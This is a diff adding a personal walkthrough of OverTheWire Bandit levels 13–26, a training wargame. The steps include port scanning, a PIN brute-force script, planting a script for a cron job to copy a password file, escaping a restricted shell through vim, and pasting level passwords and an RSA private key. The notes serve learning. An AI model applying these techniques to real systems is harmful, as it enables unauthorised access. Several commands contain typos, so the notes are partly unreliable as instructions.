@@ -423,3 +423,600 @@ zcat honeybee.bin | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | zcat
 # the file decompresses and reads
 #The password is " 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL "
 ```
+
+
+```markdown
+#Level 13
+
+#instead of looking for a password, we need to look for the ssh key
+#to log into the next next level
+#to look into this level there needs to be an understanding
+#of public and private keys
+#as well as key based ssh logins
+#so first we need to login and use the password
+#then we need to see the ssh private key for this level
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit13
+
+8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+
+#now we type in the was to see the private key
+
+cat sshkey.private
+
+#we now see the private key which is an encryption code
+#we do not need to decrypt the key, but use it to unlock the local host
+
+ssh bandit14@localhost -i sshkey.private 
+
+#this lets us use the local host and the private key to
+#get to the bandit14 user
+#but we still need the password
+#the location of the password was already given to us in the instructions
+#now we just need to cat it to see if the password is there
+
+cat /etc/bandit_pass/bandit14
+
+#there's the password " 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e "
+#now lets use the private key and bandit14's login and ssh key
+
+ssh -i ./sskey.private bandit14@localhost
+
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+#We're in.
+```
+
+
+
+```markdown
+#Level 14
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit14
+
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+#We do not need to log in or use a password since we already logged in
+#now we need to know the password for the next level
+#this level is saying we need to use port 30000 for localhost
+#we can netcat or nc to access it
+
+nc localhost 30000
+
+#we need a password which should be the same password for this lab
+
+4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+
+#we receive a password ' BfMYroe26WYalil77FoDi9qh59eK5xNr '
+```
+
+
+
+```markdown
+#Level 15
+
+
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit15
+
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+
+#For this level we gotta know some openssl
+#using the reading material offered we can see which steps to take next
+# https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
+#using the connection to ssl code from the website
+#we can change the code given to feistyduck's website to instead 
+#the localhost similar to the last level but with 30001
+
+openssl s_client -connect localhost 30001
+
+#Seeing the code it will give some commands as well as saying no port definited
+#lets make try again and make the command more like a port
+#adding -quiet to take out alot of the output from the results
+
+openssl s_client -connect localhost:30001 - quiet
+
+#it will then ask for a password 
+#the password is the same for logging into level
+
+BfMYroe26WYalil77FoDi9qh59eK5xNr
+
+#it gives password for next level cluFn7wTiGryunymYOu4RcffSxQluehd
+```
+
+
+```markdown
+#Level 16
+
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit16
+
+cluFn7wTiGryunymYOu4RcffSxQluehd
+
+
+#we are now building onto what we learned the last 2 levels
+#we will be using ranges to look for the password using nmap
+
+nmap localhost -p31000-32000
+
+#it gives us a couple of tcp ports to try
+#you can manually test them till you get the right one
+#or you can use a script to test them for you
+#going to nmap again to narrow it down to see which has service
+
+nmap localhost -p31000-32000 -sV
+
+#there is 2 connections that are showing up
+#let's test them
+
+openssl s_client -connect localhost:31790 -quiet
+
+cluFn7wTiGryunymYOu4RcffSxQluehd
+
+#this worked and it gave a private key
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+#need to echo this into a tmp file to recall it for logging into next lvl
+
+echo "-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
+JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
+x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
+KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
+J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
+d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
+YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
+vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
++TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
+8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
+SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
+HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
+SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
+R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
+Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
+R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
+L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
+blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
+YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----" > /tmp/bandit17.key
+
+
+#then need to chmod 600 /tmp/bandit17.key because
+#the private key is visible and it needs to be only visible for the one user
+
+chmod 600 /tmp/bandit17.key
+
+#now we need to log into next level 
+#while using the tmp file our private key is at
+
+ssh bandit17@localhost -i /tmp/bandit17.key 
+```
+
+
+
+
+```markdown
+#Level 17
+
+#using the ssh code we did from previous level
+#with the private key attached
+#allowed us to enter the next level 
+#without needing to type in another password
+
+ls -la
+
+#ls -la we see there is passwords.new and passwords.old
+#the instructions has a new command suggestion on using diff 
+#so lets try diff for both of them
+
+diff passwords.new passwords.old 
+
+#This gives 2 passwords
+# kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+#and
+# eG69HnVwO1p7cOdfhadHkPv8Vn0ChedC
+#Let's test them for the next lesson to see which works
+
+#I'm going to assume the first one worked
+#because it logged in saying "Byebye !"
+#but closed because bandit18 has a block on ssh logings
+```
+
+
+
+
+
+```markdown
+#Level 18
+
+
+ssh bandit.labs.overthewire.org -p2220 -i bandit18
+
+kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+
+#So we can't log in the usual ssh way into level18
+#We need another way to still get to readme without logging in same way
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit18 "cat readme"
+#we used the same way to log in but asked it to cat readme before disconnecting
+#password is ' IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x '
+```
+
+
+
+```markdown
+#Level 19
+
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit19
+
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+#ls -la will show a file called bandit20-do
+
+ls -la
+
+#can't use cat
+#trying to use ./bandit20-do asks for an id
+#so lets see what happens if we add the hint of /etc/bandit_pass
+
+./bandit20-do cat /etc/bandit_pass
+
+#not working so far but bandit_pass needs to aim for 19 or 20
+#/etc/bandit_pass/bandit20 works 
+
+./bandit20-do cat /etc/bandit_pass/bandit20
+
+#we get a password for next level ' GbKksEFF4yrVs6il55v6gwY5aVje5f0j '
+```
+
+
+
+```markdown
+#Level 20
+
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit20
+
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+#when ls -la there is suconnect showing
+#this would normally require 2 terminals to make it work for a
+#listerner and a receiver but it will not work
+#instead make a listener and receiver in same terminal
+
+echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l 1234 &
+
+./suconnect 1234
+
+#it gives us the password ' gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr '
+```
+
+
+
+```markdown
+#Level 21
+
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit21
+
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+
+#ls -la to take a look see
+
+ls -la
+
+#I got nothing to look at beside probably prevpass
+#the hints suggest looking for cron.d so let's cd into it
+
+cd /etc/cron.d/
+
+#let's cat into it
+
+cat cronjob_bandit22
+
+#it gives us /usr/bin/cronjob_bandit22.sh
+#let's cat that
+
+cat /usr/bin/cronjob_bandit22.sh
+
+#it gives us another file /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+#let's cat again
+
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+#finally it gives us a password ' Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI '
+```
+
+
+
+
+```markdown
+#Level 22
+
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit22
+
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+#following last lab, cd into cron.d and cat
+
+cd /etc/cron.d/
+
+#lets ls -la to see what's here
+
+ls -la
+
+#I see a folder for cronjob_bandit23
+#let's cat it
+
+cat cronjob_bandit23
+
+#cat gave us a user link to follow
+#let's cat it too!
+
+cat /usr/bin/cronjob_bandit23.sh
+
+#its gives us some instructions to echo copy and how to type it up
+#on the line
+# ( echo I am user $(whoami) | md5sum | cut -d ' ' -f 1 )
+#edit whoami to 'bandit23'
+
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+
+#it gave us a password ' 8ca319486bfbbc3663ea0fbe81326349 ' 
+#we should use it for the tmp/mytarget it was suggesting 
+#lets cat that tmp file
+
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+#we got a password ' jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n '
+#lets see if we can use it for the next level
+```
+
+
+
+```markdown
+#Level 23
+
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit23
+
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+#if we ls we do not have anything out of the norm when first logging in
+#let's see if what we did last level can help start us out
+#we should see if we can cd into cron.d
+
+cd /etc/cron.d/
+
+#now we can ls -la and see there is a cronjob_bandit24
+#let's try to cat it
+
+cat cronjob_bandit24
+
+cat /usr/bin/cronjob_bandit24.sh
+
+#it gave us an echo saying this
+# " echo "Executing and deleting all scripts in /var/spool/$myname:"
+#and also gave a script
+#lets see if we can make a tmp file and use the /var/spool/#myname
+
+mkdir /tmp/noclosie
+
+
+#cd into file and lets try to vim
+
+cd /tmp/noclosie
+
+vim derp.sh
+
+#we are going to make a cat for the password to show up in the script
+#when we run it later because the script earlier is going to close before
+#the password shows, so this is our storage
+
+cat /etc/bandit_pass/bandit24 >> /tmp/herpaderp/pass
+
+#need to chmod 777 to make file readable and writeable
+chmod 777 derp.sh
+
+#copying the password to the file
+cp derp.sh /var/spool/bandit24
+
+#we will need to ls to get the file to read run and show in the 'pass' file
+ls
+
+ls
+
+#we see the pass file, lets cat it
+
+cat pass
+
+#password shows up ' UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '
+```
+
+
+
+
+```markdown
+#Level 24
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit24
+
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+#nc the local host 30002 and see what it says
+
+nc localhost 30002
+
+#"I am the pincode checker for user bandit25. 
+#Please enter the password for user bandit24 
+#and the secret pincode on a single line, separated by a space."
+
+#we already have the password
+#we need to brute force to get that pincode
+#going to make a vim file then use a script
+
+vim basher.sh
+
+#!/bin/bash
+
+pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+for i in {1000..10000}
+do {
+if
+    echo $pass $i| nc localhost 30002 | grep Wrong > /dev/null
+then
+    echo $i
+else
+    echo $pass $i| nc localhost 30002
+    exit
+fi
+}
+done
+
+#now let's run the script
+
+./basher.sh
+
+#lets add chmod +x to make the script executable
+
+chmod +x basher.sh
+
+#Zzzzzzzzzzz I'll get back to you on this
+
+#Not too long, probably 30ish mins wait.
+#the pin stopped at ' 2476 '
+
+#This is what the results say
+
+#I am the pincode checker for user bandit25. 
+#Please enter the password for user bandit24 
+#and the secret pincode on a single line, separated by a space.
+#Correct!
+#The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+
+
+# So the password is ' uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG '
+```
+
+
+```markdown
+#Level 25
+
+
+ssh bandit.labs.overthewire.org -p2220 -l bandit25
+
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+#if we ls or ls -la we will see a sshkey saying "bandit26.sshkey "
+#let's use it to log in. Weeeee
+
+ssh -i ./bandit26.sshkey bandit26@bandit.labs.overthewire.org -p2220
+
+#When to log in, it automatically logs you out. Fun times.
+#maybe we can just cat it before kicking us out
+#when we are kicked out, we are sent back to user bandit25
+#lets cat /etc/pssqd | grep bandit26
+
+cat /etc/passwd | grep bandit26
+
+#it will show a file saying /usr/bin/showtext
+#let's cat it
+
+cat /usr/bin/showtext
+
+#it says it wants to show more text
+#we can manually shrink the size of the terminal to as small as we can get it
+#then log in using the we tried earlier
+
+ssh -i ./bandit26.sshkey bandit26@bandit.labs.overthewire.org -p2220
+
+#it will now let us in but we need to make a vim
+#press v
+
+v
+
+#takes us into vim shell type in
+
+
+#type :r (to run console) and then /etc/bandit_pass/bandit26 to get the level 26 password
+
+:r /etc/bandit_pass/bandit26
+
+#and there is our password ' 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z '
+#that was crazy
+```
+
+
+
+
+```markdown
+#Level 26 - 27
+
+
+#now let's log into bandit 27 with the password
+#heh. there is no lvl 27
+#but if you stick around in bandit26 and type :shell
+#you will eventually find the real bandit26 insides and there is a readme
+#the read me congratulates you and says
+
+#Congratulations on solving the last level of this game!
+
+#At this moment, there are no more levels to play in this game. However, we #are constantly working
+#on new levels and will most likely expand this game with more levels soon.
+#Keep an eye out for an announcement on our usual communication channels!
+#In the meantime, you could play some of our other wargames.
+
+#If you have an idea for an awesome new level, please let us know!
+
+#That's it! We are finished!
+
+#A final not on bandit26
+#if you have the password and the ssh, AND shrink the terminal size
+#you can easily log in with 
+#' ssh -i ./bandit26.sshkey bandit26@bandit.labs.overthewire.org -p2220 '
+# pw: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+#and not have to do anything extra to get easier access to the vim
+#after pressing " v "
+#they may fix this in the future but this is the easiest way
+#to access bandit26
+```
